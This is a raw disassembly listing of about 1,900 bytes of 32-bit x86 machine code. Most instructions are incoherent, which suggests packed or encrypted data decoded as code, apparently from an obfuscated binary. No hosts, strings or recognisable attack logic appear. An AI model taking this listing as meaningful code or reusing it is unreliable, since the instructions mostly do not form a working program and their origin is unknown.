  4089b7:	or     DWORD PTR [ebx],ecx
  4089b9:	push   cs
  4089ba:	es mov edi,0xae195304
  4089c0:	aam    0x2c
  4089c2:	adc    BYTE PTR [esi-0x52],cl
  4089c5:	sub    al,0xbb
  4089c7:	mov    eax,ds:0x6604c068
  4089cc:	xchg   ecx,eax
  4089cd:	(bad)  
  4089ce:	rep ins BYTE PTR es:[edi],dx
  4089d0:	pop    ds
  4089d1:	fs or  edi,DWORD PTR cs:[bx+di+0x3aab]
  4089d8:	push   ecx
  4089d9:	jb     0x4089ed
  4089db:	dec    ecx
  4089dc:	mov    fs,WORD PTR [ecx]
  4089de:	push   eax
  4089df:	rcr    BYTE PTR [esp+ebp*2+0x7d91564b],cl
  4089e6:	push   ebp
  4089e7:	push   cs
  4089e8:	or     eax,0x50a60f53
  4089ed:	loop   0x408a6a
  4089ef:	xchg   ebp,eax
  4089f0:	push   esi
  4089f1:	adc    eax,DWORD PTR [ebx+0x48d1366a]
  4089f7:	mov    dh,0x5d
  4089f9:	fs daa 
  4089fb:	ins    DWORD PTR es:[edi],dx
  4089fc:	fisttp WORD PTR [ebx+0x2951550c]
  408a02:	mov    DWORD PTR [ebx-0x50d90f1d],ebx
  408a08:	ins    BYTE PTR es:[edi],dx
  408a09:	ffree  st(2)
  408a0b:	mov    ds:0x6dc2b803,al
  408a10:	sbb    DWORD PTR [edx+0xfe9f13c],ebp
  408a16:	ins    DWORD PTR es:[edi],dx
  408a17:	xor    al,0xd5
  408a19:	in     eax,0xcd
  408a1b:	and    DWORD PTR ds:0x7c77e083,ecx
  408a21:	dec    esp
  408a22:	inc    esp
  408a23:	loop   0x408a1d
  408a25:	mov    eax,0x27c8e33d
  408a2a:	retf   
  408a2b:	mov    al,0xee
  408a2d:	mov    al,ds:0x3290a81a
  408a32:	gs jne 0x408a7e
  408a35:	mov    dh,0x9f
  408a37:	sub    bl,BYTE PTR [esi+0x5e14280b]
  408a3d:	retf   0xa090
  408a40:	inc    ebx
  408a41:	push   edi
  408a42:	call   0x1c89:0xfc66cecc
  408a49:	std    
  408a4a:	mov    ch,0x9c
  408a4c:	mov    bh,0x61
  408a4e:	fwait
  408a4f:	inc    ebx
  408a50:	jnp    0x4089d2
  408a52:	mov    ecx,0xc3e3b2a3
  408a57:	jl     0x408ac7
  408a59:	mov    ss,WORD PTR [esi+0x4c65393f]
  408a5f:	js     0x408aaa
  408a61:	cmp    eax,0x69d160a9
  408a66:	(bad)  
  408a67:	mov    ebp,0x2b4c6ea0
  408a6c:	adc    BYTE PTR [edx+0x3b8ec7d2],bh
  408a72:	iret   
  408a73:	xor    esp,edx
  408a75:	push   cs
  408a76:	cmp    eax,DWORD PTR [eax+ebp*4-0x59e8bf3b]
  408a7d:	out    dx,al
  408a7e:	sbb    DWORD PTR [edx+0xa],edx
  408a81:	inc    ecx
  408a82:	jbe    0x408a22
  408a84:	rol    BYTE PTR [esi],cl
  408a86:	imul   esp,DWORD PTR [eax],0x6a76c308
  408a8c:	sub    cl,0x2c
  408a8f:	jmp    0x408ab5
  408a91:	cwde   
  408a92:	xchg   ebp,eax
  408a93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a94:	inc    edx
  408a95:	aam    0xd5
  408a97:	xchg   DWORD PTR ds:0x644ff77,ebp
  408a9d:	in     al,0xf5
  408a9f:	retf   0x1b5d
  408aa2:	bound  ebp,QWORD PTR [ebp-0x57]
  408aa5:	nop
  408aa6:	mov    al,0xbc
  408aa8:	hlt    
  408aa9:	pop    eax
  408aab:	call   0xbc3cb07b
  408ab0:	jo     0x408a42
  408ab2:	add    al,0x72
  408ab4:	jae    0x408b0d
  408ab6:	cs mov esp,0x3c2f928a
  408abc:	out    dx,eax
  408abd:	aam    0x34
  408abf:	mov    dh,0xa
  408ac1:	lock mov bh,0x59
  408ac4:	inc    esp
  408ac5:	stos   BYTE PTR es:[edi],al
  408ac6:	ror    DWORD PTR [ecx+0x29a9c14d],cl
  408acc:	pop    ebx
  408acd:	push   esp
  408ace:	sub    al,0x71
  408ad0:	sbb    ch,BYTE PTR [ebp+0x56]
  408ad3:	clc    
  408ad4:	jne    0x408a8d
  408ad6:	aad    0x8c
  408ad8:	in     eax,0x6f
  408ada:	mov    eax,ds:0xc4a0244e
  408adf:	aas    
  408ae0:	or     al,dl
  408ae2:	mov    ds:0xd6f3b9c5,al
  408ae7:	or     ch,cl
  408ae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408aea:	ss or  al,0x7f
  408aed:	lds    ebp,FWORD PTR [ebx-0x57b9cde6]
  408af3:	outs   dx,DWORD PTR ds:[esi]
  408af4:	fnstenv [ecx-0xf]
  408af7:	loop   0x408b4b
  408af9:	mov    edx,0xc57cebda
  408afe:	out    0x43,al
  408b00:	mov    ds:0x4032a6fc,al
  408b05:	nop
  408b06:	sub    al,0x1
  408b08:	jmp    0xad2f:0xc46309d6
  408b0f:	ror    bl,cl
  408b11:	aad    0x99
  408b13:	inc    eax
  408b14:	aas    
  408b15:	adc    esp,edi
  408b17:	ss mov dl,0x81
  408b1a:	push   ecx
  408b1b:	mov    eax,0x67288f54
  408b20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b21:	jne    0x408ad2
  408b23:	fsubr  DWORD PTR [edi+ebx*8]
  408b26:	add    dh,BYTE PTR [ebx]
  408b28:	leave  
  408b29:	loope  0x408aee
  408b2b:	add    BYTE PTR [ebx+0x2e],bh
  408b2e:	outs   dx,DWORD PTR ds:[esi]
  408b2f:	or     BYTE PTR [ebx+ebp*1-0x2f],ah
  408b33:	xchg   ecx,eax
  408b34:	cli    
  408b35:	xchg   DWORD PTR [ebx+0x28470421],edx
  408b3b:	add    BYTE PTR [eax-0x1f],dh
  408b3e:	push   cs
  408b3f:	push   esi
  408b40:	push   esi
  408b41:	std    
  408b42:	test   eax,0x35e2c0e1
  408b47:	je     0x408b20
  408b49:	sbb    BYTE PTR [edi+0x76],bh
  408b4c:	je     0x408b43
  408b4e:	dec    ebp
  408b4f:	dec    esi
  408b50:	xchg   esi,eax
  408b51:	outs   dx,BYTE PTR ds:[esi]
  408b52:	test   DWORD PTR [edi],0xb87f9564
  408b58:	call   0x229dbdc
  408b5d:	out    dx,eax
  408b5e:	add    ax,0xe000
  408b62:	scas   al,BYTE PTR es:[edi]
  408b63:	sbb    al,0xda
  408b65:	inc    ebp
  408b66:	imul   esp,DWORD PTR [ebx],0x73
  408b69:	pop    edi
  408b6a:	loope  0x408afd
  408b6c:	mov    edi,0xebcd653
  408b71:	stc    
  408b72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b73:	rcr    BYTE PTR [edx+0x2ef6f4c1],cl
  408b79:	sub    ebp,DWORD PTR [edi-0x25b63552]
  408b7f:	push   ebx
  408b80:	xchg   ebp,eax
  408b81:	sub    BYTE PTR [esi+0x51c195f9],0x6e
  408b88:	out    0xa8,al
  408b8a:	out    0xca,al
  408b8c:	lock jge 0x408bf7
  408b8f:	inc    edx
  408b90:	loopne 0x408bde
  408b92:	or     al,BYTE PTR [ebp+0x38]
  408b95:	add    eax,0x51c00f23
  408b9a:	fst    QWORD PTR [esi]
  408b9c:	nop
  408b9d:	adc    ecx,DWORD PTR ds:0x46f48a6d
  408ba3:	aaa    
  408ba4:	xor    edi,edx
  408ba6:	inc    edx
  408ba7:	push   edx
  408ba8:	lods   eax,DWORD PTR ds:[esi]
  408ba9:	mov    ebx,0xde8ac7a8
  408bae:	dec    edx
  408baf:	xchg   esi,eax
  408bb0:	out    0x78,al
  408bb2:	fild   QWORD PTR [ebx]
  408bb4:	aas    
  408bb5:	jl     0x408b5f
  408bb7:	dec    edx
  408bb8:	inc    ebx
  408bb9:	push   es
  408bba:	(bad)  
  408bbb:	mov    eax,ds:0x26934c19
  408bc0:	xchg   esp,eax
  408bc1:	pop    ebx
  408bc2:	retf   0xe34e
  408bc5:	and    al,0x4b
  408bc7:	iret   
  408bc8:	jp     0x408c48
  408bca:	jae    0x408bd6
  408bcc:	mov    ds:0x2dc2e4ed,eax
  408bd1:	xor    esi,ecx
  408bd3:	jne    0x408bfa
  408bd5:	loopne 0x408c19
  408bd7:	cmp    cl,BYTE PTR [ebp-0x7208805f]
  408bdd:	inc    edx
  408bde:	or     eax,eax
  408be0:	scas   eax,DWORD PTR es:[edi]
  408be1:	lods   eax,DWORD PTR ds:[esi]
  408be2:	jns    0x408bec
  408be4:	loopne 0x408bfc
  408be6:	pushf  
  408be7:	cmp    al,0x8b
  408be9:	fild   QWORD PTR [edi+0x3a]
  408bec:	xor    eax,0x5cd2ddab
  408bf1:	sub    ebp,ebx
  408bf3:	jl     0x408c65
  408bf5:	or     esp,DWORD PTR [ebx-0x70b9d4b0]
  408bfb:	dec    edi
  408bfc:	pop    DWORD PTR ds:0x87b69a6a
  408c02:	iret   
  408c03:	pop    es
  408c04:	push   es
  408c05:	mov    al,ds:0xdf917d75
  408c0a:	retf   
  408c0b:	jmp    0xed42:0xc7776a78
  408c12:	test   eax,0x7da09161
  408c17:	xor    BYTE PTR [edx],ah
  408c19:	mov    ah,0xb9
  408c1b:	xchg   ecx,eax
  408c1c:	mov    ah,0xe0
  408c1e:	push   edi
  408c1f:	int    0xa4
  408c21:	mov    eax,ds:0x7cbfb9ee
  408c26:	inc    edi
  408c27:	mov    esp,0xade34460
  408c2c:	das    
  408c2d:	xchg   ecx,eax
  408c2e:	div    DWORD PTR [eax+esi*1]
  408c31:	pop    ss
  408c32:	sbb    cl,BYTE PTR [eax-0x6d58cabd]
  408c38:	fdivp  st(2),st
  408c3a:	push   0x58
  408c3c:	fbld   TBYTE PTR [ecx-0x5b]
  408c3f:	scas   al,BYTE PTR es:[edi]
  408c40:	adc    al,0x94
  408c42:	stos   BYTE PTR es:[edi],al
  408c43:	outs   dx,DWORD PTR ds:[esi]
  408c44:	pop    es
  408c45:	in     al,0x55
  408c47:	pop    ecx
  408c48:	dec    ecx
  408c49:	xchg   ecx,edx
  408c4b:	dec    BYTE PTR [edx]
  408c4d:	push   DWORD PTR [ebp-0x10]
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	bound  ebx,QWORD PTR ds:0x476a066b
  408c75:	fnstenv [eax+0x70]
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408c5c
  408c7d:	inc    ebp
  408c7e:	jg     0x408c76
  408c80:	dec    edx
  408c81:	sbb    DWORD PTR ds:0x79498f04,edx
  408c87:	leave  
  408c88:	(bad)
  408c8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c8d:	and    BYTE PTR [edx],cl
  408c8f:	jo     0x408caa
  408c91:	icebp  
  408c92:	or     eax,0x58d35cc7
  408c97:	or     eax,0x881111da
  408c9c:	push   ecx
  408c9d:	addr16 pop eax
  408c9f:	(bad)  
  408ca0:	stc    
  408ca1:	rcl    DWORD PTR [ebp-0x207f661f],cl
  408ca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ca8:	mov    dl,0xc8
  408caa:	add    BYTE PTR [ebx],dh
  408cac:	mov    WORD PTR [eax+0x53],ss
  408caf:	mov    ?,WORD PTR [esi+0x44424351]
  408cb5:	push   edx
  408cb6:	mov    al,0x38
  408cb8:	jl     0x408ce3
  408cba:	jp     0x408d2e
  408cbc:	sbb    dl,BYTE PTR [edx+0x36]
  408cbf:	and    eax,0x9c2efb99
  408cc4:	jle    0x408c49
  408cc6:	scas   eax,DWORD PTR es:[edi]
  408cc7:	inc    edi
  408cc8:	out    dx,al
  408cc9:	call   0xa0ddf932
  408cce:	call   0xcbe0:0xcd0b85bf
  408cd5:	inc    eax
  408cd6:	addr16 hlt 
  408cd8:	and    esi,DWORD PTR [edi-0xbcbb737]
  408cde:	mov    eax,0xfdfe1c76
  408ce3:	test   esp,edx
  408ce5:	fdiv   QWORD PTR [edx+ebp*1]
  408ce8:	scas   eax,DWORD PTR es:[edi]
  408ce9:	test   DWORD PTR [edi-0x5d0505a3],esp
  408cef:	cmp    bh,BYTE PTR [esi]
  408cf1:	in     eax,0x5
  408cf3:	(bad)  
  408cf5:	ret    0xcd0
  408cf8:	fimul  DWORD PTR ds:0x7c4d027f
  408cfe:	test   DWORD PTR [edx],ebx
  408d00:	or     DWORD PTR [esi-0x65],eax
  408d03:	pop    ebp
  408d04:	sub    DWORD PTR [esi],esi
  408d06:	mov    eax,ds:0xb1d8e7c2
  408d0b:	cld    
  408d0c:	xor    ebx,DWORD PTR [edx-0x1d]
  408d0f:	dec    esp
  408d10:	fwait
  408d11:	pop    esi
  408d12:	ja     0x408d6f
  408d14:	in     al,dx
  408d15:	stos   BYTE PTR es:[edi],al
  408d16:	fwait
  408d17:	loopne 0x408d10
  408d19:	push   ecx
  408d1a:	ror    ebp,0x4b
  408d1d:	imul   eax,eax,0x72
  408d20:	retf   0xa89e
  408d23:	dec    edi
  408d24:	jmp    0xd144:0x68a1dc0b
  408d2b:	mov    edi,0x92d8a6ec
  408d30:	mov    dl,0x43
  408d32:	mov    al,ds:0xe7c6082b
  408d37:	(bad)  
  408d38:	into   
  408d39:	dec    ecx
  408d3a:	adc    al,0x9e
  408d3c:	push   ebx
  408d3d:	test   eax,0x39457e35
  408d42:	lock and al,0xcf
  408d45:	ins    BYTE PTR es:[edi],dx
  408d46:	test   DWORD PTR [ebp*1+0x40693305],eax
  408d4d:	xor    al,0x36
  408d4f:	stos   BYTE PTR es:[edi],al
  408d50:	adc    ecx,DWORD PTR [esp+ecx*4+0x7c45fbae]
  408d57:	sub    al,0xfd
  408d59:	adc    DWORD PTR [eax-0x51],ebp
  408d5c:	and    ch,0x30
  408d5f:	xor    eax,DWORD PTR [esi+ebp*2-0x68]
  408d63:	jae    0x408d31
  408d65:	jle    0x408daa
  408d67:	aas    
  408d68:	and    eax,0xec901b13
  408d6d:	out    0x3a,eax
  408d6f:	mov    edi,0x2c60b91e
  408d74:	sahf   
  408d75:	pushf  
  408d76:	sti    
  408d77:	cmp    bl,BYTE PTR [edi]
  408d79:	out    dx,al
  408d7a:	jl     0x408dae
  408d7c:	xor    ebp,DWORD PTR [edx+0x3c]
  408d7f:	pop    esi
  408d80:	lods   eax,DWORD PTR ds:[esi]
  408d81:	mov    bl,0x96
  408d83:	or     cl,cl
  408d85:	inc    edx
  408d86:	in     eax,0x7f
  408d88:	inc    esi
  408d89:	xor    BYTE PTR [esp+esi*4],bl
  408d8c:	mov    ecx,0x8231200b
  408d91:	or     eax,0xde9a4505
  408d96:	xchg   ebx,eax
  408d97:	les    esi,FWORD PTR [eax-0x3a1d149b]
  408d9d:	cdq    
  408d9e:	popa   
  408d9f:	adc    BYTE PTR [ebx+0x4e],bl
  408da2:	fild   WORD PTR ds:0xe284e084
  408da8:	imul   esp,DWORD PTR [ecx+0x69a42d51],0x4d
  408daf:	sbb    DWORD PTR ds:0xcadf7324,0xffffff91
  408db6:	call   0xb4fa2f20
  408dbb:	xchg   ecx,eax
  408dbc:	mov    al,ds:0x14ecc5fc
  408dc1:	push   esp
  408dc2:	pop    ebx
  408dc3:	fwait
  408dc4:	push   ds
  408dc5:	pop    ecx
  408dc6:	inc    ebx
  408dc7:	push   0xffffff92
  408dc9:	adc    al,0x7c
  408dcb:	dec    ebp
  408dcc:	jo     0x408e4b
  408dce:	sbb    DWORD PTR [esi+0x6c],ecx
  408dd1:	fwait
  408dd2:	cmp    cl,BYTE PTR [ecx-0x9]
  408dd5:	mov    ch,0x52
  408dd7:	push   esp
  408dd8:	xchg   esp,eax
  408dd9:	pusha  
  408dda:	mov    BYTE PTR [eax+0x7c],ch
  408ddd:	xor    bl,ah
  408ddf:	retf   
  408de0:	popf   
  408de1:	repz inc ecx
  408de3:	dec    edi
  408de4:	push   ss
  408de5:	in     al,dx
  408de6:	pop    eax
  408de7:	popf   
  408de8:	lods   eax,DWORD PTR ds:[esi]
  408de9:	pop    ebx
  408dea:	mov    ch,0xe2
  408dec:	mov    bh,BYTE PTR [ecx+0x32]
  408def:	in     al,0x5d
  408df1:	adc    ecx,ebp
  408df3:	imul   DWORD PTR [esi-0x20]
  408df6:	mov    esi,0x9dd6c55d
  408dfb:	(bad)  
  408dfc:	lods   al,BYTE PTR ds:[esi]
  408dfd:	mov    ah,BYTE PTR [eax+0x6]
  408e00:	pop    ss
  408e01:	push   eax
  408e02:	mov    BYTE PTR [esi],0x3
  408e05:	idiv   ebx
  408e07:	test   cl,dh
  408e09:	add    bl,BYTE PTR [ebx]
  408e0b:	hlt    
  408e0c:	xor    edx,DWORD PTR ss:[edi-0x39]
  408e10:	cmp    ebx,0xa99878c3
  408e16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e17:	pop    esp
  408e18:	push   esp
  408e19:	pop    ebp
  408e1a:	xchg   esi,eax
  408e1b:	xchg   ebx,eax
  408e1c:	imul   edi,ebp,0xffffffdd
  408e1f:	add    eax,0xeea1250e
  408e24:	dec    eax
  408e25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e26:	je     0x408e44
  408e28:	aaa    
  408e29:	test   DWORD PTR [ebx+0x9930f3],0x33bc58e8
  408e33:	dec    esp
  408e34:	(bad)  
  408e35:	or     DWORD PTR [eax-0x48],eax
  408e38:	nop
  408e39:	mov    DWORD PTR ds:0xee6956ce,eax
  408e3f:	dec    esi
  408e40:	adc    al,0xe7
  408e42:	pop    es
  408e43:	pop    edi
  408e44:	sar    BYTE PTR [ebp+0x44aaff21],cl
  408e4a:	mov    ecx,0x9b06362b
  408e4f:	jp     0x408e74
  408e51:	outs   dx,BYTE PTR ds:[esi]
  408e52:	pop    edi
  408e53:	inc    edi
  408e54:	xor    BYTE PTR [eax],bh
  408e56:	dec    edi
  408e57:	div    BYTE PTR [ebx-0x66c6167f]
  408e5d:	in     eax,dx
  408e5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e5f:	jge    0x408edc
  408e61:	jle    0x408eb5
  408e63:	mul    ecx
  408e65:	int    0x1b
  408e67:	mov    al,0xd0
  408e69:	cmp    eax,0xa9c38baf
  408e6e:	pusha  
  408e6f:	mov    eax,0x85b8aefc
  408e74:	dec    BYTE PTR [esi+0x3f]
  408e77:	or     esi,DWORD PTR [esp+edx*1-0x1fb0180f]
  408e7e:	sbb    ah,BYTE PTR cs:[ebp+0x1c]
  408e82:	push   0x5f37d096
  408e87:	daa    
  408e88:	jne    0x408e0a
  408e8a:	push   esp
  408e8b:	mov    cl,0x3a
  408e8d:	mov    ebx,0x9ba4b8fa
  408e92:	mov    ecx,0xf4d8f4d8
  408e97:	dec    esi
  408e98:	add    al,0xa7
  408e9a:	xchg   esp,eax
  408e9b:	fst    DWORD PTR [edx+0x1d]
  408e9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e9f:	add    BYTE PTR [ecx+0x12],bh
  408ea2:	xchg   DWORD PTR [esp+ebp*2+0x6abf4c8e],edi
  408ea9:	sti    
  408eaa:	or     DWORD PTR [edi-0x25bafd8],esp
  408eb0:	popa   
  408eb1:	out    0xc1,al
  408eb3:	cmp    DWORD PTR [ecx+0x5],ecx
  408eb6:	jp     0x408e40
  408eb8:	add    eax,edx
  408eba:	and    al,0x75
  408ebc:	mov    eax,0xd06791e2
  408ec1:	pop    edx
  408ec2:	pusha  
  408ec3:	leave  
  408ec4:	xchg   esp,eax
  408ec5:	(bad)  
  408ec6:	or     ebp,DWORD PTR [esi+0x4e]
  408ec9:	lds    ebp,FWORD PTR [edi+0x6b]
  408ecc:	and    eax,0x1a887162
  408ed1:	xor    BYTE PTR [edi+0x40],dl
  408ed4:	out    0xb7,al
  408ed6:	(bad)  
  408ed7:	mov    ah,ah
  408ed9:	loope  0x408f43
  408edb:	ret    
  408edc:	bound  ebx,QWORD PTR ds:0x273682b
  408ee2:	mov    dh,0x2b
  408ee4:	sub    BYTE PTR [ecx+0x68a327c1],ch
  408eea:	inc    esp
  408eeb:	or     BYTE PTR [eax-0x42],ch
  408eee:	iret   
  408eef:	lea    edi,[eax+0xc]
  408ef2:	add    BYTE PTR [ebx+0x4d8d8123],bh
  408ef8:	mov    esp,0xec72c949
  408efd:	jl     0x408f51
  408eff:	fimul  DWORD PTR [eax+0x31]
  408f02:	ja     0x408f1d
  408f04:	imul   esi,ebx,0xffffffc7
  408f07:	call   0x9805:0x181ad5a0
  408f0e:	out    dx,eax
  408f0f:	mov    edx,0x25b895b4
  408f14:	push   cs
  408f15:	lods   al,BYTE PTR ds:[esi]
  408f16:	mov    edi,0xeae1c6fe
  408f1b:	xchg   DWORD PTR [eax],ebx
  408f1d:	pop    ss
  408f1e:	sub    ecx,DWORD PTR [edi+eiz*4-0x5e4987fe]
  408f25:	pushf  
  408f26:	mov    edi,0x1a177bab
  408f2b:	into   
  408f2c:	xchg   BYTE PTR ds:0x18dc,dl
  408f31:	lods   al,BYTE PTR ds:[esi]
  408f32:	or     al,0xd2
  408f34:	add    al,0x90
  408f36:	sbb    ecx,esp
  408f38:	stos   DWORD PTR es:[edi],eax
  408f39:	fwait
  408f3a:	ret    
  408f3b:	shl    DWORD PTR [ebx],1
  408f3d:	imul   edi,DWORD PTR [esi+0x1a928f4f],0x7953c841
  408f47:	pop    ss
  408f48:	je     0x408f50
  408f4a:	add    bl,BYTE PTR gs:[edx-0x1b]
  408f4e:	mov    ds:0xf0723d17,eax
  408f53:	repnz repz dec edx
  408f56:	pop    ss
  408f57:	clc    
  408f58:	cmp    DWORD PTR [edi+0x43],esi
  408f5b:	rcr    BYTE PTR [eax],cl
  408f5d:	lods   eax,DWORD PTR ds:[esi]
  408f5e:	pop    ss
  408f5f:	xchg   esi,eax
  408f60:	fcomip st,st(3)
  408f62:	xchg   edx,eax
  408f63:	ins    BYTE PTR es:[edi],dx
  408f64:	mov    cl,0xf9
  408f66:	pop    ebx
  408f67:	adc    cl,BYTE PTR [edx+edi*2]
  408f6a:	pop    ds
  408f6b:	imul   edi,ebp,0x9ad51d5
  408f71:	mov    bh,BYTE PTR [ebx+ecx*2]
  408f74:	call   0x763d:0x7f64cc40
  408f7b:	xor    BYTE PTR [eax+ebx*2],0x41
  408f7f:	pusha  
  408f80:	mov    edx,0xc8d2b5a5
  408f85:	or     eax,0x4eb351aa
  408f8a:	pop    ebp
  408f8b:	mov    ah,ah
  408f8d:	cmp    cl,BYTE PTR [edx]
  408f8f:	push   ebp
  408f90:	les    eax,FWORD PTR [ecx+0x4b9f7e45]
  408f96:	add    al,0xd8
  408f98:	pop    ebp
  408f99:	inc    eax
  408f9a:	es cli 
  408f9c:	or     bh,cl
  408f9e:	cmp    edi,DWORD PTR [eiz*8+0x414ad697]
  408fa5:	mov    edx,DWORD PTR [edi+ebp*8+0x38742eee]
  408fac:	push   DWORD PTR [eax]
  408fae:	lea    eax,ds:0x41b02c
  408fb4:	jmp    0x409301
  408fb9:	add    al,0x7c
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0x941937f3
  408fc6:	das    
  408fc7:	sub    eax,0x70e67749
  408fcc:	jo     0x408fee
  408fce:	jge    0x409040
  408fd0:	jo     0x40903a
  408fd2:	imul   esi,DWORD PTR [eax],0x3d917675
  408fd8:	pop    esp
  408fd9:	jne    0x409020
  408fdb:	sti    
  408fdc:	gs pop ebx
  408fde:	imul   esp,DWORD PTR [ebx-0x39],0x7d
  408fe2:	dec    eax
  408fe3:	push   edx
  408fe4:	in     al,0x2f
  408fe6:	mov    dh,0x19
  408fe8:	inc    ebp
  408fe9:	adc    eax,0x4b6f4b91
  408fee:	call   0x69a4311b
  408ff3:	mov    ch,0xfb
  408ff5:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  408ff7:	lea    edx,[edx]
  408ff9:	sbb    eax,0xc5d131e5
  408ffe:	jecxz  0x409055
  409000:	(bad)  
  409002:	mov    ecx,0x4a9276be
  409007:	xor    dh,BYTE PTR [edi+0x4b]
  40900a:	mov    cl,bh
  40900c:	mov    WORD PTR [eax+ebx*2-0x18b43f0e],es
  409013:	dec    esp
  409014:	sub    BYTE PTR [eax-0x53],dh
  409017:	aas    
  409018:	nop
  409019:	sub    ebp,DWORD PTR [ebp+0x1d846d5b]
  40901f:	xchg   esi,eax
  409020:	addr16 jne 0x408fa9
  409023:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  409025:	ret    0x2caf
  409028:	mov    esi,0x929aa030
  40902d:	xor    bl,BYTE PTR [edx+0x7a37a064]
  409033:	sub    al,0x84
  409035:	sbb    ah,cl
  409037:	(bad)  
  409038:	mov    bh,0x5d
  40903a:	pop    ecx
  40903b:	outs   dx,BYTE PTR ds:[esi]
  40903c:	adc    eax,0xcee42df6
  409041:	dec    edi
  409042:	std    
  409043:	ror    DWORD PTR [eax],cl
  409045:	inc    ebx
  409046:	popa   
  409047:	xor    eax,ebx
  409049:	ins    BYTE PTR es:[edi],dx
  40904a:	call   WORD PTR [edi-0x7f45fe16]
  409051:	hlt    
  409052:	stc    
  409053:	mov    ds:0xc53f0ec3,al
  409058:	mov    ecx,0x8e95de93
  40905d:	adc    edx,DWORD PTR [esi+eax*1]
  409060:	(bad)  
  409061:	div    DWORD PTR [esi]
  409063:	sub    dl,bh
  409065:	jecxz  0x409066
  409067:	daa    
  409068:	add    ch,bh
  40906a:	int3   
  40906b:	sbb    al,0xe1
  40906d:	inc    esi
  40906e:	rol    BYTE PTR [edx-0x78],1
  409071:	or     eax,0xbb919d5f
  409076:	mov    ?,WORD PTR [esi+0x313ffa1d]
  40907c:	repz xor eax,0xd30766db
  409082:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  409084:	loopne 0x409075
  409086:	cmp    BYTE PTR [ecx-0x46],dh
  409089:	inc    esp
  40908a:	push   ds
  40908b:	into   
  40908c:	jmp    0x409012
  40908e:	mov    BYTE PTR [edx],cl
  409090:	jle    0x40909f
  409092:	arpl   WORD PTR [ebp+0x49],cx
  409095:	rcr    BYTE PTR [edx-0x6],0x4a
  409099:	xor    eax,0x4dacea7a
  40909e:	jbe    0x40904a
  4090a0:	ror    BYTE PTR [ecx+0x56],cl
  4090a3:	jbe    0x409084
  4090a5:	stos   DWORD PTR es:[edi],eax
  4090a6:	push   0x4c
  4090a8:	je     0x4090a0
  4090aa:	pop    fs
  4090ac:	ds and al,0x37
  4090af:	add    eax,0xb95a2e91
  4090b4:	rcl    DWORD PTR [edi+0x9],1
  4090b7:	call   0x26b40d82
  4090bc:	jae    0x409130
  4090be:	sar    DWORD PTR [esp+edx*8-0x60],0x56
  4090c3:	pushf  
  4090c4:	mov    dh,0xb8
  4090c6:	call   0x8bf9ca2e
  4090cb:	scas   eax,DWORD PTR es:[edi]
  4090cc:	lea    esi,[ebp-0x7640bf09]
  4090d2:	dec    ebp
  4090d3:	xchg   ecx,eax
  4090d4:	or     eax,0x864a6d55
  4090d9:	loop   0x4090b7
  4090db:	hlt    
  4090dc:	and    ebp,edx
  4090de:	fisttp DWORD PTR [ecx+0x2c]
  4090e1:	xor    BYTE PTR [eax],cl
  4090e3:	push   ecx
  4090e4:	punpckhwd mm5,QWORD PTR [esi+0x29b05f5e]
  4090eb:	push   ebx
  4090ec:	add    BYTE PTR [edx],ah
  4090ee:	sti    
  4090ef:	dec    edx
  4090f0:	sti    
  4090f1:	ins    DWORD PTR es:[edi],dx
  4090f2:	jae    0x4090ed
  4090f4:	aas    
  4090f5:	dec    ebp
  4090f6:	sti    
  4090f7:	mov    ah,dl
  4090f9:	push   ebx
  4090fa:	jae    0x40907e
  4090fc:	cmp    eax,0x5efe6e6f
  409101:	aam    0xd8
  409103:	mov    ds:0x63be2802,eax
  409108:	mov    bh,0xe2
  40910a:	out    dx,eax
  40910b:	add    eax,0x74dcec32
  409110:	shr    DWORD PTR [eax],0x78
  409113:	(bad)  
  409114:	sub    DWORD PTR [ecx-0x3f],eax
  409117:	adc    eax,0xf8b7094c
  40911c:	mov    BYTE PTR [eax],cl
  40911e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40911f:	rcr    DWORD PTR [edi-0x62c10c9],cl
  409125:	scas   eax,DWORD PTR es:[edi]
  409126:	push   ebp
  409127:	xor    eax,0x94826ec9
  40912c:	fst    DWORD PTR [eax-0x9]
  40912f:	fisubr DWORD PTR [ebx-0x42d9c3d0]
  409135:	dec    esi
  409136:	vpor   xmm3,xmm3,XMMWORD PTR [edi+0x7378347a]
  40913e:	(bad)  
  40913f:	adc    cl,BYTE PTR [eax]
  409141:	jns    0x409149
  409143:	std    
  409144:	jg     0x4091a7
  409146:	imul   edi,DWORD PTR [ebp-0x45],0xbe50c7db
  40914d:	push   edx
  40914e:	or     eax,0x98510137
  409153:	jle    0x40910f
  409155:	test   BYTE PTR [ecx+0x44],0xee
  409159:	dec    ebp
  40915a:	mov    al,0x82
  40915c:	push   0xc14c6c4d
  409161:	mov    bh,0xf7
  409163:	push   es
  409164:	mov    ecx,DWORD PTR [ecx+0x60]
  409167:	les    ebp,FWORD PTR [ebx-0x7]
  40916a:	out    0xee,al
  40916c:	add    DWORD PTR [ebx-0x73210d07],0xffffffd5
  409173:	retf   0x156c
  409176:	mov    dl,0x67
  409178:	add    BYTE PTR [ecx],bh
  40917a:	jge    0x40912d
  40917c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40917d:	adc    al,0x8d
  40917f:	xchg   esp,eax
  409180:	ret    
  409181:	lock dec edx
